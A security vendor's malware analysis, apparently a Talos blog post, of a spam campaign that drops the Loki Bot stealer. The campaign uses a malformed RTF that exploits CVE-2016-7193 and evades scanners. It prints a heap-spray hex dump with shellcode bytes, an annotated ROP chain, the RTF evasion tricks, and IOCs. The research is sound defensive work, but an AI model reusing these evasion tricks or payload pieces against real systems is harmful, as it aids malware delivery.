@@ -1,0 +1,277 @@
+
+How Malformed RTF Defeats Security Engines
+
+
+This post is authored by Paul Rascagneres with contributions from Alex McDonnell
+
+
+Executive Summary
+
+Talos has discovered a new spam campaign used to infect targets with the well known  Loki Bot stealer. The infection vector is an RTF document abusing an old exploit (CVE-2016-7193), however the most interesting part is the effort put into the generation of the RTF. The document contains several malformations designed to defeat security engines and parsers. The attacker has gone out of their way to attempt to evade content inspection devices like AV or network security devices. According to VirusTotal, the initial detection rate of a malicious RTF document recovered from a recent spam campaign is only 3 out of 45 available engines.
+
+Despite the known vulnerability, many security products fail to identify the exploit because they are unable to correctly classify the RTF file format and scan the embedded OLE document within in the RTF. Even open-source parsers such as rtfobj.py from oletools have difficulties  extracting the embedded OLE:
+
+
+
+
+This article explains how the malware author modified the RTF file in order to bypass security protection and frustrate malware researchers.
+
+
+
+
+Spam example
+
+The spam campaign contains different kinds of emails. Many emails consist of  a common "Invoice" attachment, but some emails are more advanced, as we can see in this example:
+
+
+
+
+
+
+
+Malformed RTF
+
+The analysed sample illustrated in the article has a SHA256 of 66de8e2f1d5ebbf3f8c511d5cd6394e24be3c694e78d614dfe703f8aa198906f.
+
+
+RTF reminder
+
+The RTF format is a proprietary file format developed by Microsoft. In our case, we are mainly concerned by the {\objdata  HEXA} subpart of an "Object". This data block permits the inclusion of an OLE object within a RTF document. The data is represented as the hexadecimal value of the OLE, for example:
+
+{\objdata  
+dde00000
+00000000
+00000000
+576f726400446f63756d656e74003132
+00000000
+00000000
+00c20000
+d0cf11e0a1b11ae1000000000000000000000000000000003e00 … }
+
+
+Modification of the file header
+
+The first modification in the RTF document is the header. If we refer to the Microsoft documentation, a RTF document should start by "{\rtN" where N is the version of RTF. Here is the header of the malicious RTF:
+
+
+
+
+The document does not contain a valid version and additionally, it includes the header of a PNG image. The consequence of this trick is that some tools are not able to detect the file type correctly:
+
+
+
+
+
+
+Adding ignored hexadecimal value
+
+The second tweak implemented by the author is adding ignored hexadecimal values. For example, in the following snippet, we can see additional 0x0d (CR - carriage return) characters included.
+
+
+
+
+
+Microsoft will simply ignore this non-ASCII characters. In our example, the final value will be "000000105000000000".
+
+
+Adding Ignored Characters
+
+Additionally, the malware author adds ignored ASCII characters in the document
+
+
+
+
+
+In this example the ".}" and "}" values will be ignored by Office. However, third party parsers could recognize the characters as the end of the data and truncate the OLE.
+
+
+Exploit & Malware
+
+The embedded OLE object contains a document in Microsoft OOXML format. The ActiveX XML files included in the OOXML document help  identify the vulnerability:
+
+
+
+
+The classid 1EFB6596-857C-11D1-B16A-00C0F0283628 matches the MSCOMCTL TabStrip control component. This component is frequently used to accomplish heap spray. In our context, the malicious document exploits the  CVE-2016-7193: an array out of bounds in RTF parser.
+
+The exploit is a classic heap spray located in a binary blob:
+
+00000cf0  cc cc cc cc eb 51 36 7c  eb 51 36 7c 02 2b 37 7c  |.....Q6|.Q6|.+7||
+00000d00  01 02 00 00 64 43 34 7c  40 00 00 00 28 1a 35 7c  |....dC4|@...(.5||
+00000d10  c7 0f 39 7c 9e 2e 34 7c  0f a4 34 7c dc 50 36 7c  |..9|..4|..4|.P6||
+00000d20  a3 15 34 7c 97 7f 34 7c  51 a1 37 7c 4d 8c 37 7c  |..4|..4|Q.7|M.7||
+00000d30  30 5c 34 7c 90 90 90 90  90 90 90 90 90 90 90 90  |0\4|............|
+00000d40  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
+00000d50  e9 1f 01 00 00 cc cc cc  cc cc cc cc cc cc cc cc  |................|
+00000d60  cc cc cc cc cc cc cc cc  cc cc cc cc cc cc cc cc  |................|
+*
+00000e50  c3 6f 37 7c c3 6f 37 7c  c3 6f 37 7c c3 6f 37 7c  |.o7|.o7|.o7|.o7||
+*
+00000e70  90 90 90 90 90 90 90 90  d9 eb 9b d9 74 24 f4 5d  |............t$.]|
+00000e80  8d 4d 17 ba 47 01 00 00  80 31 12 41 4a 75 f9 23  |.M..G....1.AJu.#|
+00000e90  db 76 99 63 22 99 64 1e  99 64 1e bf 99 22 99 64  |.v.c".d..d...".d|
+00000ea0  0a 9b e4 f9 4b 72 9b ef  9b e1 44 99 61 2e 99 66  |....Kr....D.a..f|
+00000eb0  0c 6a 13 cc 44 99 64 32  13 cc 23 db 5b 53 bf 13  |.j..D.d2..#.[S..|
+00000ec0  ca 44 23 e4 1d ac 02 2a  c4 66 1a d3 dc 15 13 c4  |.D#....*.f......|
+00000ed0  52 f9 e3 2b 67 12 4c 67  f6 48 9b cd 99 48 36 13  |R..+g.Lg.H...H6.|
+00000ee0  e9 74 99 1e 59 99 48 0e  13 e9 99 16 99 13 ea 9b  |.t..Y.H.........|
+
+
+The code highlighted in blue is the ROP Chain previously documented here.
+
+0x7c3651eb # pop ebp # ret
+0x7c3651eb # skip 4 bytes
+0x7c372b02 # pop ebx # ret
+0x00000201 # 0x201 -> ebx
+0x7c344364 # pop edx # ret
+0x00000040 # 0x40 -> edx
+0x7c351a28 # pop ecx # ret
+0x7c390fc7 # &Writable location -> ecx
+0x7c342e9e # pop edi # ret
+0x7c34a40f # ret -> edi
+0x7c3650dc # pop esi # ret
+0x7c3415a3 # jmp dword ptr [eax] -> esi
+0x7c347f97 # pop eax # ret
+0x7c37a151 # ptr to &VirtualProtect() - 0x0EF
+0x7c378c4d # pushad # add al,0EFh # ret
+0x7c345c30 # push esp # ret
+
+
+The code highlighted in red is the NOP sled followed by a jump (orange) to the shellcode (bold):
+
+
+
+
+
+
+
+The purpose of the shellcode is:
+
+
+
+to decode an executable embedded in the document;
+
+to drop it into %APPDATA%\7B4331\1C8BBC.exe;
+
+to execute it.
+
+
+
+The binary is a Loki Bot stealer communicating with the command and control domain paneltestghelp.xyz. Here is a screenshot of the network connection to the CC:
+
+
+
+
+Conclusion
+
+
+
+This campaign shows that the sophistication and innovation within an attack is not limited to the exploits used. In this case the attackers have used a well known vulnerability, however, this has been combined with a good knowledge of the RTF file format to forge a malicious document designed to avoid detection by security products and maximise the chances that the target will open the document.
+
+Coverage
+
+Additional ways our customers can detect and block this threat are listed below.
+
+
+
+Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.
+
+CWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks.
+
+Email Security can block malicious emails sent by threat actors as part of their campaign.
+
+The Network Security protection of IPS and NGFW have up-to-date signatures to detect malicious network activity by threat actors.
+
+AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.
+
+Umbrella,  our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.
+
+
+IOCs
+
+Networks:
+
+
+hxxp://paneltestghelp.xyz:80/eval/server/readonly/fre.php
+
+
+
+SHA256 of the dropped executables:
+
+
+da1a6747a3329c3a317d4bd7ecf029e89bd76192075f84834563103a54bac968
+2e65f8fc7901505dd4225ec66cca0ef308f2b6fbe48d37f5055775854bf7a5f8
+a3c3abcd461d00e1f928e375770e39e3a33f719d7287a2fee661d82ce8de1c56
+
+
+
+SHA256 of malicious samples with similar malformations of the RTF file format:
+
+
+7b684ad97bb9f5093e5cfb100352ad2f0ec3dfce63232207daf0aa736d6438c9
+14a6e04a60b1bb5f4d0fb3fffa240b7b34bf9c0b8504da19caeb31182510c139
+1ae6aa92ce8ee9a2ab78631663fa5a9bdcc14490c4c5fe799b41d26455b5b696
+4f2c10b64d4f4b56d56b5a271331c92484b6ddf8c4eb9f56669ed60545a4c06d
+b1da2cb4fcee52cdc94c06325c339ac11a3fb1e399e1ed5a2a55107f5f64867f
+41c4483cfcc0b5a10504aa137ec3824d139663b7ec318d5e1fb6c9f5db8af8f9
+f07f87ab68482d329eeac5525ea5f189bcd720d2b2d149db61ab81ae04be957a
+be81741ae3c7c2c5000785a2573c901068a2906054690ac22119ac794aa9e8e2
+cd16e420fbc39b63de93198cdb1265c1bfe83119c7d4d75d5501465cdd0847f1
+b330fadeb337e9fb5aa9f8046462e3d1d418946fd6237bc252a80a2d4fb2fff7
+629d1afbedd7cc082549d5c3fc3926b6b4e55abc3c07f8d994a791893a2fd530
+9f48ce01ac99033c03e9aa983c09fa273eae0e168e55de8cc364311ae4fc88b9
+dd783bcdbc81bc605cf07545a01273596d4e51b198874253815069cd6708b2fa
+59011fa80db84cea54bc6ec7f7bc689d916f04e8df9950b259ad524142225731
+7aa0abedd75c46680ac65814d9433a04bb9f6bc6f094d66cc33a918f32dcb2fa
+ad3af8a7ab469fa930d0873475214c3160f52b17c06f296d6ce9cc6fc92e8a79
+89a1264bd7facf02d48aff46724a0215c2fb1974d06451cebefdb2ea7ea9a71a
+c53bf11adb48a00393c30a0902716e0088f650750349f5966ba3b60a0fa17487
+4a7d6c770c5fdbb32534b535efe0324e3bc25a8bcd3551b7fe0ff3610ee81299
+6077c3ed4dc67526f89b2c59fc16b389530a73b326f63fff17ae7c824b7770fd
+11836837753c754997adf8ccf4fa8ba824e57725f56fbcd3b0d903e1fa30ac5b
+737d1468b20dc39300bc2be38285b6482940d2be9ae59b7dc984cf4dc6d82053
+415b9e72811cd7c50366d9c9038df02fe3bbfc6446ef42b099d85ea576fbd35d
+84a2ded87681e65be35994ea26f4b2287e52438bbeebaac784c291196a6f94c6
+9c62f4947a572356f43f71fb55f2b702b78c2e1688c67eff89c36da50137ed21
+c201e4bb7b68b4655ab7ac85c8a7c93abe2238ec3d24914d86e8a543b6c6abbd
+17ae8d128938131ebc944f5d77be7009fd05c8831f88ef3558cc9c00f0633f97
+dbc97df1e5036ac572d8a247a6b073ab1f1dabd20676443598135c6743534028
+79316e4c2601a5721d5d6ada0f152790ad44aa9ac5badf17e12c7825fb1f46aa
+a406f0208c914ff28f8e30eda539acb6abd23bbdecf704be4b77615a27f62e8d
+552fe8b5fd175822d4479552078331dbfb16881fea9514377a802f3cce87ac02
+27290fd934092cf1ca2a242e6847665a16771376af8f5c81ef1c851463e77709
+66de8e2f1d5ebbf3f8c511d5cd6394e24be3c694e78d614dfe703f8aa198906f
+a0e529ed847b78fd68a871688a7e99e6abc87295c671a3e2d02a61a1e04f5ce9
+5c1db6ce5989645bbc8cb8489dee2fb99eba7b4093eaad96cd5a6c692a53c245
+c343e92d30c1374c631efa8cf612faf5567e8bd66330e1ff58ac9296c3373304
+ecc9526b380bd109dbcb3d9c4635c1866234d302658758d6ecf4e927a12af9a1
+450b2d6741a452d3bff491fb3a40ec8e29cbaf24fb1b400863efe1a7f920543e
+99a3939d654e4c424dcf33fbc18c7568d1030981ad1ae8f2a6da2966efbff669
+e7fc4527e4cb65e05069b871e06226ce9c9669649ed9cfbad2dcb41cdd9fe94c
+1d73428619f69cbdfc5158f1682cc304ba6af2a0b425244bcd8c2c432d4a50d7
+cbb58841ef2179e52fcfb918d085503ccf4482014fa1f0714e11fd667de974a0
+44583aca68ce734bccc79d28f666bdc81a1436c257f035875df15a82f35e6910
+5872ec86add4892f061cc1fd2478da098645876d0b13d3ce3e789f526c5b8ec8
+9eb85367bd59854ccd7b8e13a22deec92bbe746a5de83820d7265055f96da40f
+6d33cd5b7cfcc4a55583adbf75f578d71d6aa572e93c5a7392ece4dc8204d0f8
+4d46087599b246cd297883341859561b3b1794419c704b167a28c7891ff5d7b1
+7c5337250b6a1ede2472e4acc74366e8a425eaf2c36e3805d36200ad560d0feb
+bc4f30177538628f93d57ae1e59859c50409afefe133956ec801c040ab9253f5
+726f170f13b9a24d409c0c4fbf0a14aff0f3cd1662762230bfaf7a8822257880
+885877989df73bafd087f7c689eedfa5e2fe3620ab62d6ff57a3394702761751
+9f40662ebbd3a848219aa47c149c174c292cea5e62dcc0bd26f12e1bf5ba7d7c
+0882c8a38ca485fe9763b0c0c7c5a22c330cebe86101a9e1ffa5a70c4f58faac
+156cbbb25240e246a2340e1bca1692b7110277bac30f76dcacd48dd5f2042caa
+a28c3c075ecfb982e6e3cb237c0eab1308f023e7bcf207d0fd1f2b4f29791074
+e5de4a14367d1a7b599d7afae07aa66c63941238ff25f4f17dea54db6d8ac350
+5d6b52287f4fdefe0621d9fadd83b0531f56811937b023ce49e426e320b372f5
+599a60601345bf8fc05f27d35f3c3f2ed80b6e7890d5f33a57f75c09a089356a
+194549b3fd0be8a701b8433db1b2cff396a4492c342632fa22d6af89570eff46
+673f9469ff150c8c821ea3b5b1cda8175d09719fbd7d1359d334dbf17f74adbe
+f81be30a7d6792e59f5a0ade225472042c9eb9bf59b03f67e85b0642c16e59ce
+5957fe5e38f2b2530569e21f040a92b1fb36816b6d5187d8a0ecf0ba84f36519
+66de8e2f1d5ebbf3f8c511d5cd6394e24be3c694e78d614dfe703f8aa198906f
+
+
+
+
